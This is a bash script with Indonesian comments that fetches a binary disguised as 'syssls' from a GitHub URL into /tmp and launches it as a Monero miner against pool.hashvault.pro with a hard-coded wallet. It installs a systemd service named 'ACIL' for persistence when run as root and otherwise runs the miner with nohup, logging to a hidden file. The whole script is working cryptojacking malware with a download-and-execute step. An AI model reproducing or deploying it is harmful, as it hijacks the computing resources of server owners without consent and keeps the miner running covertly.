#!/bin/bash

# Pindah ke direktori /tmp
cd /tmp

if [[ -f "/tmp/syssls" ]]; then
    echo "File syssls ditemukan, siap dieksekusi."
else
    echo "File syssls tidak ditemukan, proses unduhan."
    # Download dan ekstrak syssls.tar.gz dari GitHub
    curl -L https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/syssls.tar.gz | tar zx
fi

# Mendapatkan alamat IP publik VPS
IP_PUBLIC=$(curl -s http://ipecho.net/plain)

# Mendapatkan alamat IP lokal VPS
IP_LOCAL=$(hostname -I | awk '{print $1}')

# Mengganti titik dengan hubung pada IP publik dan lokal
IP_PUBLIC_REPLACED=$(echo "$IP_PUBLIC" | sed 's/\./-/g')
IP_LOCAL_REPLACED=$(echo "$IP_LOCAL" | sed 's/\./-/g')

# Menentukan apakah IP publik adalah IPv6
if [[ "$IP_PUBLIC" =~ : ]]; then
    # Jika IPv6, gunakan IP lokal
    IP_TO_USE=$IP_LOCAL_REPLACED
else
    # Jika IPv4, gunakan IP publik
    IP_TO_USE=$IP_PUBLIC_REPLACED
fi

# Output hasil
echo "IP yang digunakan (dengan tanda hubung): $IP_TO_USE"

# Cek apakah user saat ini adalah root atau bukan
if [ "$(id -u)" -eq 0 ]; then
    # Jika root, buat dan aktifkan service systemd
    echo -e "[Unit]
Description=ACIL
After=network.target

[Service]
Type=simple
Restart=on-failure
RestartSec=15s
ExecStart=/tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass VPS-$IP_TO_USE --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/acil.service

    chmod 644 /etc/systemd/system/acil.service
    systemctl daemon-reload
    systemctl enable acil.service
    systemctl start acil.service

    echo "Systemd service untuk ACIL telah dibuat, dimuat, dan dimulai."
else
    # Jika bukan root, jalankan dengan nohup
    nohup /tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass VPS-$IP_TO_USE --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > /tmp/.logacil 2>&1 &
    echo "Menjalankan miner sebagai user non-root dengan nohup."
fi
